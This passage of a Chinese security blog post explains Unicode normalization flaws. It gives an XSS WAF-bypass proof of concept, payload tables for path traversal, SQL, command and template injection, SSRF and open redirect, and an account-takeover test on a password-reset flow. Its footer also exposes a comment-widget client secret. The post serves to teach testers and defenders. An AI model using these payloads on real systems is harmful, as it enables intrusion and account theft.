+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">name = unicodedata.normalize(<span class="string">&#x27;NFKD&#x27;</span>, name)</span><br></pre></td></tr></table></figure>
+
+<p>我们可以观察到，在 WAF 分析输入后，服务器正在执行一些 unicode 规范化。因此，与普通 XSS 有效负载相比，标准化后具有相同 unicode 值的有效负载将触发相同的结果：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">＜img src⁼p onerror⁼＇prompt⁽1⁾＇﹥</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><strong>Request:</strong></li>
+</ul>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET /?name=%EF%BC%9Cimg%20src%E2%81%BCp%20onerror%E2%81%BC%EF%BC%87prompt%E2%81%BD1%E2%81%BE%EF%BC%87%EF%B9%A5</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><strong>Response:</strong></li>
+</ul>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">HTTP/1.0</span> <span class="number">200</span> OK</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>text/html; charset=utf-8</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>41</span><br><span class="line"></span><br><span class="line"><span class="language-subunit"><span class="keyword">Test </span>XSS: &lt;img src=p onerror=&#x27;prompt(1)&#x27;&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://jlajara.gitlab.io/assets/images/posts/20200219/2.png"></p>
+<p>完美，但是如何找到这些字符？这种方法可以绕过其他漏洞的一些限制吗？</p>
+<h3 id="如何找到规范化的字符？"><a href="#如何找到规范化的字符？" class="headerlink" title="如何找到规范化的字符？"></a>如何找到规范化的字符？</h3><p>为了在 unicode 兼容后找到具有相同含义的字符的完整列表，可以使用以下网站：</p>
+<ul>
+<li><a target="_blank" rel="noopener" href="https://www.compart.com/en/unicode">https://www.compart.com/en/unicode</a></li>
+</ul>
+<p>可以搜索一个字符，找到兼容后的相同字符。例如，<code>&lt;</code>- <a target="_blank" rel="noopener" href="https://www.compart.com/en/unicode/U+003C">https://www.compart.com/en/unicode/U+003C</a></p>
+<p><img src="https://jlajara.gitlab.io/assets/images/posts/20200219/3.png"></p>
+<p>显示这三个字符 <code>≮ </code>，<code>﹤</code> 和 <code>＜</code>。单击每个后，我们可以在分解部分看到以以下方式标准化：</p>
+<ul>
+<li><code>≮ </code>- &lt;(U+003C) -  <code>◌̸ </code>(U+0338)</li>
+<li><code>﹤</code>- &lt;(U+003C)</li>
+<li><code>＜</code>- &lt;(U+003C)</li>
+</ul>
+<p>在这种情况下， 字符 <code>≮ </code> 将无法实现我们想要的功能，因为它会注入字符 <code>◌̸ </code> (U+0338)， 并将破坏我们的有效负载。</p>
+<h3 id="利用其他漏洞"><a href="#利用其他漏洞" class="headerlink" title="利用其他漏洞"></a>利用其他漏洞</h3><p>如果应用程序执行了Unicode规范化，可以尝试制作大量自定义 payload，并在以下漏洞中应用：</p>
+<ul>
+<li><strong>Path Traversal</strong></li>
+</ul>
+<table>
+<thead>
+<tr>
+<th>Character</th>
+<th>Payload</th>
+<th>After Normalization</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>‥ (U+2025)</td>
+<td>‥&#x2F;‥&#x2F;‥&#x2F;etc&#x2F;passwd</td>
+<td>..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd</td>
+</tr>
+<tr>
+<td>︰(U+FE30)</td>
+<td>︰&#x2F;︰&#x2F;︰&#x2F;etc&#x2F;passwd</td>
+<td>..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd</td>
+</tr>
+</tbody></table>
+<ul>
+<li><strong>SQL Injection</strong></li>
+</ul>
+<table>
+<thead>
+<tr>
+<th>Character</th>
+<th>Payload</th>
+<th>After Normalization</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>＇(U+FF07)</td>
+<td>＇ or ＇1＇&#x3D;＇1</td>
+<td>’ or ‘1’&#x3D;’1</td>
+</tr>
+<tr>
+<td>＂(U+FF02)</td>
+<td>＂ or ＂1＂&#x3D;＂1</td>
+<td>” or “1”&#x3D;”1</td>
+</tr>
+<tr>
+<td>﹣ (U+FE63)</td>
+<td>admin＇﹣﹣</td>
+<td>admin’–</td>
+</tr>
+</tbody></table>
+<ul>
+<li><strong>Server Side Request Forgery (SSRF)</strong></li>
+</ul>
+<table>
+<thead>
+<tr>
+<th>Character</th>
+<th>Payload</th>
+<th>After Normalization</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>⓪ (U+24EA)</td>
+<td>①②⑦.⓪.⓪.①</td>
+<td>127.0.0.1</td>
+</tr>
+</tbody></table>
+<ul>
+<li><strong>Open Redirect</strong></li>
+</ul>
+<table>
+<thead>
+<tr>
+<th>Character</th>
+<th>Payload</th>
+<th>After Normalization</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>。(U+3002)</td>
+<td>jlajara。gitlab。io</td>
+<td>jlajara.gitlab.io</td>
+</tr>
+<tr>
+<td>／(U+FF0F)</td>
+<td>／／jlajara.gitlab.io</td>
+<td>&#x2F;&#x2F;jlajara.gitlab.io</td>
+</tr>
+</tbody></table>
+<ul>
+<li><strong>XSS</strong></li>
+</ul>
+<table>
+<thead>
+<tr>
+<th>Character</th>
+<th>Payload</th>
+<th>After Normalization</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>＜(U+FF1C)</td>
+<td>＜script src&#x3D;a／＞</td>
+<td>＜script src&#x3D;a&#x2F;&gt;</td>
+</tr>
+<tr>
+<td>＂(U+FF02)</td>
+<td>＂onclick&#x3D;＇prompt(1)＇</td>
+<td>“onclick&#x3D;’prompt(1)’</td>
+</tr>
+</tbody></table>
+<ul>
+<li><strong>Template Injection</strong></li>
+</ul>
+<table>
+<thead>
+<tr>
+<th>Character</th>
+<th>Payload</th>
+<th>After Normalization</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>﹛(U+FE5B)</td>
+<td>﹛﹛3+3﹜﹜</td>
+<td>6</td>
+</tr>
+<tr>
+<td>［ (U+FF3B)</td>
+<td>［［5+5］］</td>
+<td>[[5+5]]</td>
+</tr>
+</tbody></table>
+<ul>
+<li><strong>OS Command Injection</strong></li>
+</ul>
+<table>
+<thead>
+<tr>
+<th>Character</th>
+<th>Payload</th>
+<th>After Normalization</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>＆ (U+FF06)</td>
+<td>＆＆whoami</td>
+<td>&amp;&amp;whoami</td>
+</tr>
+<tr>
+<td>｜ (U+FF5C)</td>
+<td>｜｜ whoami</td>
+<td>||whoami</td>
+</tr>
+</tbody></table>
+<ul>
+<li><strong>Arbitrary file upload</strong></li>
+</ul>
+<table>
+<thead>
+<tr>
+<th>Character</th>
+<th>Payload</th>
+<th>After Normalization</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>ｐ (U+FF50) ʰ (U+02B0)</td>
+<td>test.ｐʰｐ</td>
+<td>test.php</td>
+</tr>
+</tbody></table>
+<ul>
+<li><strong>Business logic</strong></li>
+</ul>
+<p>注册具有与其他用户相似的某些字符的用户。也许注册过程会允许注册，因为这一步的用户没有被规范化并且允许这个字符。之后，假设应用程序在检索到用户数据后执行了一些规范化。</p>
+<ol>
+<li>注册ªdmin。数据库中没有条目，注册成功。</li>
+<li>登录为ªdmin。后端执行规范化并给出admin.</li>
+<li>账户接管。</li>
+</ol>
+<table>
+<thead>
+<tr>
+<th>Character</th>
+<th>Payload</th>
+<th>After Normalization</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>ª (U+00AA)</td>
+<td>ªdmin</td>
+<td>admin</td>
+</tr>
+</tbody></table>
+<h3 id="识别-Unicode-规范化漏洞"><a href="#识别-Unicode-规范化漏洞" class="headerlink" title="识别 Unicode 规范化漏洞"></a>识别 Unicode 规范化漏洞</h3><p>我们可以通过提交一些特定的异型字符，如：𝕃ⅇ𝙤𝓃ⅈ𝔰𝔥𝙖𝓃，并查看返回内容是否包含Leonishan，以确定是否存在该漏洞。</p>
+<p>提交有效载荷的 URL 编码版本 𝕃ⅇ𝙤𝓃ⅈ𝔰𝔥𝙖𝓃 ( %F0%9D%95%83%E2%85%87%F0%9D%99%A4%F0%9D%93%83%E2%85%88%F0%9D%94%B0%F0%9D%94%A5%F0%9D%99%96%F0%9D%93%83) 会给出以下响应：</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">HTTP/1.0</span> <span class="number">200</span> OK</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>text/html; charset=utf-8</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>19</span><br><span class="line"></span><br><span class="line"><span class="language-subunit"><span class="keyword">Test </span>XSS: Leonishan</span></span><br></pre></td></tr></table></figure>
+
+<p>因此，进行了 unicode 兼容性 ✅</p>
+<p>如果我们提交有效载荷并且响应如下：</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">HTTP/1.0</span> <span class="number">200</span> OK</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>text/html; charset=utf-8</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>44</span><br><span class="line"></span><br><span class="line"><span class="language-subunit"><span class="keyword">Test </span>XSS: ðâð¤ðâð°ð¥ðð</span></span><br></pre></td></tr></table></figure>
+
+<p>不执行 Unicode 兼容性 ❌</p>
+<p>注意：如果要使用 BurpSuite 执行此测试，则必须首先对有效负载进行 URL 编码。Burp 的编辑器不能正确处理多字节字符。</p>
+<h3 id="一次真实的简单测试"><a href="#一次真实的简单测试" class="headerlink" title="一次真实的简单测试"></a>一次真实的简单测试</h3><p>对某系统的忘记密码功能进行测试，发现 account 参数存在 Unicode 兼容解析。注册一个与真实账号（<code>44***31992************</code>） 类似的账号<code>44***³1992************</code> ，账户信息手机号码处填写攻击者的手机号码。执行忘记密码流程，账户填写 <code>44***³1992************</code>，攻击者手机能成功接收重置后的密码。使用重置后的密码登陆真实账号<code>44***31992************</code>，成功登陆。</p>
+<p><img src="https://raw.githubusercontents.com/sing3r/image/main/hexoImage20220413200326.png"></p>
+<h2 id="0x03-参考"><a href="#0x03-参考" class="headerlink" title="0x03 参考"></a>0x03 参考</h2><p><a target="_blank" rel="noopener" href="https://www.runoob.com/w3cnote/charset-encoding.html/">https://www.runoob.com/w3cnote/charset-encoding.html\</a><br><a target="_blank" rel="noopener" href="https://blog.csdn.net/hyongilfmmm/article/details/112045049/">https://blog.csdn.net/hyongilfmmm/article/details/112045049\</a><br><a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/1470820/">https://cloud.tencent.com/developer/article/1470820\</a><br><a target="_blank" rel="noopener" href="https://www.jianshu.com/p/4b6861e22df7/">https://www.jianshu.com/p/4b6861e22df7\</a><br><a target="_blank" rel="noopener" href="https://www.cnblogs.com/benbenalin/p/6921553.html/">https://www.cnblogs.com/benbenalin/p/6921553.html\</a><br><a target="_blank" rel="noopener" href="https://security.stackexchange.com/questions/48879/why-does-directory-traversal-attack-c0af-work/">https://security.stackexchange.com/questions/48879/why-does-directory-traversal-attack-c0af-work\</a><br><a target="_blank" rel="noopener" href="https://jlajara.gitlab.io/web/2020/02/19/Bypass_WAF_Unicode.html">https://jlajara.gitlab.io/web/2020/02/19/Bypass_WAF_Unicode.html</a></p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/Unicode/" rel="tag"># Unicode</a>
+              <a href="/tags/UTF-8/" rel="tag"># UTF-8</a>
+              <a href="/tags/%E7%BC%96%E7%A0%81/" rel="tag"># 编码</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2022/04/07/%E4%BB%8EMSSQL%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E5%88%B0%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5%EF%BC%8C%E5%AE%9E%E7%8E%B0%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" rel="prev" title="从MSSQL报错注入到堆叠注入，实现命令执行">
+      <i class="fa fa-chevron-left"></i> 从MSSQL报错注入到堆叠注入，实现命令执行
+    </a></div>
+      <div class="post-nav-item"></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+    <div class="comments" id="gitalk-container"></div>
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#unicode-%E7%9B%B8%E5%85%B3%E6%BC%8F%E6%B4%9E"><span class="nav-number">1.</span> <span class="nav-text">unicode 相关漏洞</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#0x01-unicode-%E7%9A%84%E8%A7%A3%E6%9E%90%E9%94%99%E8%AF%AF%E6%BC%8F%E6%B4%9E"><span class="nav-number">1.1.</span> <span class="nav-text">0x01- unicode 的解析错误漏洞</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%A5%87%E6%80%AA%E7%9A%84-payload"><span class="nav-number">1.1.1.</span> <span class="nav-text">奇怪的 payload</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%A8%E6%A0%B9%E9%97%AE%E5%BA%95"><span class="nav-number">1.1.2.</span> <span class="nav-text">刨根问底</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%89%8D%E6%8F%90%E7%9F%A5%E8%AF%86%E7%82%B9%E4%B8%80%EF%BC%9AURL%E7%BC%96%E7%A0%81%E7%9F%A5%E8%AF%86"><span class="nav-number">1.1.2.1.</span> <span class="nav-text">前提知识点一：URL编码知识</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%89%8D%E6%8F%90%E7%9F%A5%E8%AF%86%E7%82%B9%E4%BA%8C%EF%BC%9AUTF-8-%E7%BC%96%E7%A0%81%E7%9F%A5%E8%AF%86"><span class="nav-number">1.1.2.2.</span> <span class="nav-text">前提知识点二：UTF-8 编码知识</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x02-unicode-%E8%A7%84%E8%8C%83%E5%8C%96%E6%BC%8F%E6%B4%9E"><span class="nav-number">1.2.</span> <span class="nav-text">0x02- unicode 规范化漏洞</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Unicode-%E5%85%BC%E5%AE%B9%E6%80%A7%E8%A1%A8%E6%A0%BC"><span class="nav-number">1.2.1.</span> <span class="nav-text">Unicode 兼容性表格</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%A6%82%E5%BF%B5%E8%AF%81%E6%98%8E"><span class="nav-number">1.2.2.</span> <span class="nav-text">概念证明</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%A6%82%E4%BD%95%E6%89%BE%E5%88%B0%E8%A7%84%E8%8C%83%E5%8C%96%E7%9A%84%E5%AD%97%E7%AC%A6%EF%BC%9F"><span class="nav-number">1.2.3.</span> <span class="nav-text">如何找到规范化的字符？</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%A9%E7%94%A8%E5%85%B6%E4%BB%96%E6%BC%8F%E6%B4%9E"><span class="nav-number">1.2.4.</span> <span class="nav-text">利用其他漏洞</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%AF%86%E5%88%AB-Unicode-%E8%A7%84%E8%8C%83%E5%8C%96%E6%BC%8F%E6%B4%9E"><span class="nav-number">1.2.5.</span> <span class="nav-text">识别 Unicode 规范化漏洞</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%B8%80%E6%AC%A1%E7%9C%9F%E5%AE%9E%E7%9A%84%E7%AE%80%E5%8D%95%E6%B5%8B%E8%AF%95"><span class="nav-number">1.2.6.</span> <span class="nav-text">一次真实的简单测试</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x03-%E5%8F%82%E8%80%83"><span class="nav-number">1.3.</span> <span class="nav-text">0x03 参考</span></a></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">singsing</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives">
+          <span class="site-state-item-count">14</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+        <span class="site-state-item-count">6</span>
+        <span class="site-state-item-name">categories</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+        <span class="site-state-item-count">29</span>
+        <span class="site-state-item-name">tags</span></a>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2022</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">singsing</span>
+</div>
+  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://muse.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a>
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/muse.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.css">
+
+<script>
+NexT.utils.loadComments(document.querySelector('#gitalk-container'), () => {
+  NexT.utils.getScript('//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.js', () => {
+    var gitalk = new Gitalk({
+      clientID    : '6e8bfc081de57f042466',
+      clientSecret: '9b93268b65af7c8c4e8af7a5a1a539f01671b723',
+      repo        : 'sing3r.github.io',
+      owner       : 'sing3r',
+      admin       : ['sing3r'],
+      id          : '673e1a44588c33d19268c54cf0cbe96c',
+        language: '',
+      distractionFreeMode: true
+    });
+    gitalk.render('gitalk-container');
+  }, window.Gitalk);
+});
+</script>
+
+</body>
+</html>
